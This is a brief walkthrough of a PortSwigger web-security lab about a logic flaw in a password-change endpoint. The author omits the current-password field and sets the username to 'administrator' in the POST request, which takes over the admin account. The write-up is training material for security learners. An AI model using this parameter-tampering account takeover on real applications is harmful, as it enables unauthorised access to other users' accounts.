
# Weak isolation on dual-use endpoint

This lab makes a flawed assumption about the user's privilege level based on their input. As a result, you can exploit the logic of its account management features to gain access to arbitrary users' accounts. To solve the lab, access the administrator account and delete Carlos.

You can log in to your own account using the following credentials: wiener:peter

---------------------------------------------

References: 

- https://portswigger.net/web-security/logic-flaws/examples



![img](images/Weak%20isolation%20on%20dual-use%20endpoint/1.png)

---------------------------------------------

Request generated when changing user's password:



![img](images/Weak%20isolation%20on%20dual-use%20endpoint/2.png)


```
POST /my-account/change-password HTTP/2
...

csrf=ujBucKnnF9611L81nMWHpHhtHVneK8JR&username=administrator&new-password-1=test&new-password-2=test
```



![img](images/Weak%20isolation%20on%20dual-use%20endpoint/3.png)


Then we can access with credentials administrator:test:



![img](images/Weak%20isolation%20on%20dual-use%20endpoint/4.png)